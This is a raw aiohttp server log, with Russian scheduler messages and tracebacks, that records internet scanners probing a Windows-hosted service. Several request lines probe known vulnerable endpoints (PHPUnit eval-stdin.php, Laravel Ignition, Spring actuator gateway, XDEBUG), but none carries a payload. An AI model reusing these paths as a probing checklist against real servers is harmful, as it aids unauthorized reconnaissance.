2026-05-23 20:14:54 | INFO     | aiohttp.access | 71.6.134.230 [23/May/2026:19:14:54 -0800] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
2026-05-23 20:30:51 | INFO     | aiohttp.access | 71.6.134.230 [23/May/2026:19:30:51 -0800] "GET / HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
2026-05-23 20:31:42 | INFO     | aiohttp.access | 71.6.134.230 [23/May/2026:19:31:42 -0800] "GET /favicon.ico HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
2026-05-23 20:33:37 | INFO     | aiohttp.access | 47.77.233.162 [23/May/2026:19:33:37 -0800] "GET / HTTP/1.1" 404 173 "-" "curl/7.64.1"
2026-05-23 20:33:40 | INFO     | aiohttp.access | 47.77.233.162 [23/May/2026:19:33:40 -0800] "GET / HTTP/1.1" 404 192 "-" "curl/7.74.0"
2026-05-23 20:33:58 | INFO     | aiohttp.access | 123.160.223.74 [23/May/2026:19:33:58 -0800] "GET / HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
2026-05-23 21:01:43 | INFO     | apscheduler.executors.default | Running job "check_expired_subscriptions (trigger: interval[12:00:00], next run at: 2026-05-24 16:01:43 UTC)" (scheduled at 2026-05-24 04:01:43.638576+00:00)
2026-05-23 21:01:43 | INFO     | scheduler.tasks | Запуск проверки истёкших подписок...
2026-05-23 21:01:43 | INFO     | scheduler.tasks | Истёкших подписок нет
2026-05-23 21:01:43 | INFO     | apscheduler.executors.default | Job "check_expired_subscriptions (trigger: interval[12:00:00], next run at: 2026-05-24 16:01:43 UTC)" executed successfully
2026-05-23 21:07:53 | INFO     | aiohttp.access | 198.235.24.232 [23/May/2026:20:07:53 -0800] "GET / HTTP/1.1" 404 173 "-" "Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity"
2026-05-23 21:35:36 | INFO     | aiohttp.access | 45.198.224.5 [23/May/2026:20:35:36 -0800] "GET /login HTTP/1.1" 404 173 "-" "Go-http-client/1.1"
2026-05-23 22:03:39 | INFO     | aiohttp.access | 3.131.220.121 [23/May/2026:21:03:39 -0800] "GET / HTTP/1.1" 404 173 "-" "visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
2026-05-23 22:04:52 | INFO     | aiohttp.access | 3.131.220.121 [23/May/2026:21:04:52 -0800] "GET / HTTP/1.1" 404 173 "-" "visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
2026-05-23 22:04:59 | ERROR    | asyncio | Exception in callback _ProactorBasePipeTransport._call_connection_lost(None)
handle: <Handle _ProactorBasePipeTransport._call_connection_lost(None)>
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\asyncio\events.py", line 88, in _run
    self._context.run(self._callback, *self._args)
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\asyncio\proactor_events.py", line 165, in _call_connection_lost
    self._sock.shutdown(socket.SHUT_RDWR)
ConnectionResetError: [WinError 10054] An existing connection was forcibly closed by the remote host
2026-05-23 22:06:31 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01'
      ^
2026-05-23 22:06:31 | INFO     | aiohttp.access | 3.131.220.121 [23/May/2026:21:06:31 -0800] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
2026-05-23 22:07:39 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01'
      ^
2026-05-23 22:07:39 | INFO     | aiohttp.access | 3.131.220.121 [23/May/2026:21:07:39 -0800] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
2026-05-23 22:17:43 | INFO     | aiohttp.access | 151.243.11.35 [23/May/2026:21:17:43 -0800] "GET / HTTP/1.1" 404 192 "-" "curl/7.68.0"
2026-05-23 22:43:16 | INFO     | aiohttp.access | 151.243.11.245 [23/May/2026:21:43:16 -0800] "GET / HTTP/1.1" 404 192 "-" "curl/7.68.0"
2026-05-23 23:05:51 | INFO     | aiohttp.access | 45.198.224.9 [23/May/2026:22:05:51 -0800] "GET / HTTP/1.1" 404 192 "-" "curl/7.68.0"
2026-05-23 23:21:17 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x03\x01\xa6\x01'
      ^
2026-05-23 23:21:17 | INFO     | aiohttp.access | 157.230.99.66 [23/May/2026:22:21:17 -0800] "UNKNOWN / HTTP/1.0" 400 225 "-" "-"
2026-05-23 23:21:17 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x03\x01\xa6\x01'
      ^
2026-05-23 23:21:17 | INFO     | aiohttp.access | 157.230.99.66 [23/May/2026:22:21:17 -0800] "UNKNOWN / HTTP/1.0" 400 225 "-" "-"
2026-05-23 23:21:17 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x03\x01W\x01'
      ^
2026-05-23 23:21:17 | INFO     | aiohttp.access | 157.230.99.66 [23/May/2026:22:21:17 -0800] "UNKNOWN / HTTP/1.0" 400 222 "-" "-"
2026-05-23 23:21:17 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x03\x01I\x01'
      ^
2026-05-23 23:21:17 | INFO     | aiohttp.access | 157.230.99.66 [23/May/2026:22:21:17 -0800] "UNKNOWN / HTTP/1.0" 400 222 "-" "-"
2026-05-23 23:21:17 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x03\x01\x9a\x01'
      ^
2026-05-23 23:21:17 | INFO     | aiohttp.access | 157.230.99.66 [23/May/2026:22:21:17 -0800] "UNKNOWN / HTTP/1.0" 400 225 "-" "-"
2026-05-23 23:21:17 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x02\x01\x9b\x01'
      ^
2026-05-23 23:21:17 | INFO     | aiohttp.access | 157.230.99.66 [23/May/2026:22:21:17 -0800] "UNKNOWN / HTTP/1.0" 400 225 "-" "-"
2026-05-23 23:21:17 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01\x01\xa8\x01'
      ^
2026-05-23 23:21:17 | INFO     | aiohttp.access | 157.230.99.66 [23/May/2026:22:21:17 -0800] "UNKNOWN / HTTP/1.0" 400 225 "-" "-"
2026-05-23 23:21:17 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01\x01\xa8\x01'
      ^
2026-05-23 23:21:17 | INFO     | aiohttp.access | 157.230.99.66 [23/May/2026:22:21:17 -0800] "UNKNOWN / HTTP/1.0" 400 225 "-" "-"
2026-05-23 23:21:17 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01\x01\x9e\x01'
      ^
2026-05-23 23:21:17 | INFO     | aiohttp.access | 157.230.99.66 [23/May/2026:22:21:17 -0800] "UNKNOWN / HTTP/1.0" 400 225 "-" "-"
2026-05-23 23:21:17 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01\x01\xb5\x01'
      ^
2026-05-23 23:21:17 | INFO     | aiohttp.access | 157.230.99.66 [23/May/2026:22:21:17 -0800] "UNKNOWN / HTTP/1.0" 400 225 "-" "-"
2026-05-23 23:21:17 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01'
      ^
2026-05-23 23:21:17 | INFO     | aiohttp.access | 157.230.99.66 [23/May/2026:22:21:17 -0800] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
2026-05-23 23:21:17 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01'
      ^
2026-05-23 23:21:17 | INFO     | aiohttp.access | 157.230.99.66 [23/May/2026:22:21:17 -0800] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
2026-05-24 00:27:46 | INFO     | aiohttp.access | 79.124.40.174 [23/May/2026:23:27:46 -0800] "GET /securityRealm/user/admin/search/index?q=a HTTP/1.1" 404 192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2026-05-24 00:28:52 | INFO     | aiohttp.access | 79.124.40.174 [23/May/2026:23:28:52 -0800] "GET / HTTP/1.1" 404 192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2026-05-24 00:36:30 | INFO     | aiohttp.access | 45.135.193.193 [23/May/2026:23:36:30 -0800] "CONNECT  HTTP/1.1" 404 173 "-" "-"
2026-05-24 00:37:37 | INFO     | aiohttp.access | 79.124.40.174 [23/May/2026:23:37:37 -0800] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2026-05-24 00:43:13 | INFO     | aiohttp.access | 79.124.40.174 [23/May/2026:23:43:13 -0800] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2026-05-24 00:45:15 | INFO     | aiohttp.access | 79.124.40.174 [23/May/2026:23:45:15 -0800] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2026-05-24 00:48:57 | INFO     | aiohttp.access | 5.61.209.126 [23/May/2026:23:48:57 -0800] "GET /SDK/webLanguage HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
2026-05-24 00:54:21 | INFO     | aiohttp.access | 79.124.40.174 [23/May/2026:23:54:21 -0800] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 404 192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2026-05-24 00:57:07 | INFO     | aiohttp.access | 79.124.40.174 [23/May/2026:23:57:07 -0800] "GET /console/ HTTP/1.1" 404 192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2026-05-24 01:05:57 | INFO     | aiohttp.access | 79.124.40.174 [24/May/2026:00:05:57 -0800] "GET /_ignition/execute-solution HTTP/1.1" 404 192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2026-05-24 01:09:02 | INFO     | aiohttp.access | 79.124.40.174 [24/May/2026:00:09:02 -0800] "GET / HTTP/1.1" 404 192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2026-05-24 01:18:01 | INFO     | aiohttp.access | 79.124.40.174 [24/May/2026:00:18:01 -0800] "GET / HTTP/1.1" 404 192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2026-05-24 01:18:52 | INFO     | aiohttp.access | 79.124.40.174 [24/May/2026:00:18:52 -0800] "GET /actuator/gateway/routes HTTP/1.1" 404 192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2026-05-24 01:25:24 | INFO     | aiohttp.access | 45.198.224.148 [24/May/2026:00:25:24 -0800] "CONNECT  HTTP/1.1" 404 173 "-" "Go-http-client/1.1"
2026-05-24 01:31:46 | INFO     | aiohttp.access | 79.124.40.174 [24/May/2026:00:31:46 -0800] "GET /geoserver HTTP/1.1" 404 192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2026-05-24 01:33:43 | INFO     | aiohttp.access | 195.140.214.23 [24/May/2026:00:33:43 -0800] "GET /zc?action=getInfo HTTP/1.1" 404 192 "-" "Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/)"
2026-05-24 01:33:50 | INFO     | aiohttp.access | 213.166.84.35 [24/May/2026:00:33:50 -0800] "GET / HTTP/1.1" 404 192 "-" "Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/)"
2026-05-24 01:33:50 | INFO     | aiohttp.access | 217.146.80.99 [24/May/2026:00:33:50 -0800] "GET /favicon.ico HTTP/1.1" 404 192 "-" "Mozilla/5.0 (compatible; Infrawatch/1.0; +https://infrawat.ch/)"
2026-05-24 01:38:05 | INFO     | aiohttp.access | 79.124.40.174 [24/May/2026:00:38:05 -0800] "POST / HTTP/1.1" 404 192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
2026-05-24 01:39:39 | INFO     | aiohttp.access | 13.219.227.32 [24/May/2026:00:39:39 -0800] "GET / HTTP/1.1" 404 173 "-" ""
2026-05-24 01:39:40 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01\x02'
      ^
2026-05-24 01:39:40 | INFO     | aiohttp.access | 13.219.227.32 [24/May/2026:00:39:40 -0800] "UNKNOWN / HTTP/1.0" 400 217 "-" "-"
2026-05-24 01:40:20 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01\x02'
      ^
2026-05-24 01:40:20 | INFO     | aiohttp.access | 13.222.135.228 [24/May/2026:00:40:20 -0800] "UNKNOWN / HTTP/1.0" 400 217 "-" "-"
2026-05-24 02:07:45 | INFO     | aiohttp.access | 100.53.26.124 [24/May/2026:01:07:45 -0800] "GET /m3bZ HTTP/1.1" 404 173 "-" ""
2026-05-24 02:07:45 | INFO     | aiohttp.access | 100.53.26.124 [24/May/2026:01:07:45 -0800] "GET /9Xjb HTTP/1.1" 404 173 "-" ""
2026-05-24 02:07:46 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01\x02'
      ^
2026-05-24 02:07:46 | INFO     | aiohttp.access | 100.53.26.124 [24/May/2026:01:07:46 -0800] "UNKNOWN / HTTP/1.0" 400 217 "-" "-"
2026-05-24 02:07:47 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01\x02'
      ^
2026-05-24 02:07:47 | INFO     | aiohttp.access | 100.53.26.124 [24/May/2026:01:07:47 -0800] "UNKNOWN / HTTP/1.0" 400 217 "-" "-"
2026-05-24 02:31:18 | INFO     | aiohttp.access | 45.198.224.5 [24/May/2026:01:31:18 -0800] "GET /login HTTP/1.1" 404 173 "-" "Go-http-client/1.1"
2026-05-24 02:40:28 | INFO     | aiohttp.access | 66.132.172.34 [24/May/2026:01:40:28 -0800] "GET / HTTP/1.1" 404 173 "-" "-"
2026-05-24 02:40:38 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01'
      ^
2026-05-24 02:40:38 | INFO     | aiohttp.access | 66.132.172.34 [24/May/2026:01:40:38 -0800] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
2026-05-24 02:40:41 | INFO     | aiohttp.access | 66.132.172.34 [24/May/2026:01:40:41 -0800] "GET / HTTP/1.1" 404 173 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
2026-05-24 02:40:41 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadHttpMessage: 400, message:
  Pause on PRI/Upgrade:

    b''
      ^
2026-05-24 02:40:41 | INFO     | aiohttp.access | 66.132.172.34 [24/May/2026:01:40:41 -0800] "UNKNOWN / HTTP/1.0" 400 195 "-" "-"
2026-05-24 02:40:45 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x16\x03\x01'
      ^
2026-05-24 02:40:45 | INFO     | aiohttp.access | 66.132.172.34 [24/May/2026:01:40:45 -0800] "UNKNOWN / HTTP/1.0" 400 213 "-" "-"
2026-05-24 02:40:46 | INFO     | aiohttp.access | 66.132.172.34 [24/May/2026:01:40:46 -0800] "GET /wiki HTTP/1.1" 404 173 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
2026-05-24 03:10:00 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x05\x01'
      ^
2026-05-24 03:10:00 | INFO     | aiohttp.access | 185.91.127.85 [24/May/2026:02:10:00 -0800] "UNKNOWN / HTTP/1.0" 400 209 "-" "-"
2026-05-24 03:10:00 | INFO     | aiohttp.access | 185.91.127.85 [24/May/2026:02:10:00 -0800] "CONNECT  HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
2026-05-24 03:10:00 | INFO     | aiohttp.access | 185.91.127.85 [24/May/2026:02:10:00 -0800] "CONNECT  HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
2026-05-24 03:10:00 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x05\x02'
      ^
2026-05-24 03:10:00 | INFO     | aiohttp.access | 185.91.127.85 [24/May/2026:02:10:00 -0800] "UNKNOWN / HTTP/1.0" 400 209 "-" "-"
2026-05-24 03:10:00 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "aiohttp\\_http_parser.pyx", line 557, in aiohttp._http_parser.HttpParser.feed_data
aiohttp.http_exceptions.BadStatusLine: 400, message:
  Invalid method encountered:

    b'\x05\x02'
      ^
2026-05-24 03:10:00 | INFO     | aiohttp.access | 185.91.127.85 [24/May/2026:02:10:00 -0800] "UNKNOWN / HTTP/1.0" 400 209 "-" "-"
2026-05-24 03:10:00 | INFO     | aiohttp.access | 185.91.127.85 [24/May/2026:02:10:00 -0800] "CONNECT  HTTP/1.1" 404 173 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
2026-05-24 03:10:00 | ERROR    | aiohttp.server | Error handling request
Traceback (most recent call last):
  File "C:\Users\Admin\AppData\Local\Programs\Python\Python312\Lib\site-packages\aiohttp\web_protocol.py", line 350, in data_received
    messages, upgraded, tail = self._request_parser.feed_data(data)
                               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
